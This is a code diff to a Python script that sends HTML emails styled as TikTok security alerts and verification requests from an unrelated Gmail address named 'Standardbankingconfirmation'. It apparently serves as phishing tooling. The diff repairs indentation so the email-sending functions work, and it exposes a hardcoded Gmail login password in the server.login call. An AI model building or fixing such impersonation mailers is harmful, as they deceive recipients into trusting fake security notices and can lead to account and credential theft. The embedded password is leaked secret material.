@@ -279,8 +279,8 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
         username (str): Username for the greeting
     """
 
-# Create message
-msg = MIMEMultipart("alternative")
+    # Create message
+    msg = MIMEMultipart("alternative")
     msg["From"] = "Standardbankingconfirmation@gmail.com"  # Fixed: Use actual sender email
     msg["To"] = recipient_email
     msg["Subject"] = "TikTok: Security Alert - New Device Login Detected"
@@ -594,9 +594,9 @@ msg = MIMEMultipart("alternative")
 </html>"""
 
     # Attach HTML content
-msg.attach(MIMEText(html_content, "html"))
+    msg.attach(MIMEText(html_content, "html"))
 
-# Send email
+    # Send email
     try:
         server = smtplib.SMTP(smtp_server, port)
         server.starttls()
@@ -808,11 +808,11 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
     msg.attach(MIMEText(html_content, "html"))
     
     try:
-server = smtplib.SMTP(smtp_server, port)
-server.starttls()
+        server = smtplib.SMTP(smtp_server, port)
+        server.starttls()
         server.login("Standardbankingconfirmation@gmail.com", "udyu gyfv rfjj fvgk")  # Fixed: Use global Gmail credentials
         server.sendmail(msg["From"], recipient_email, msg.as_string())
-server.quit()
+        server.quit()
         print(f"✅ TikTok verification email sent successfully to {recipient_email}!")
         return True
     except Exception as e:
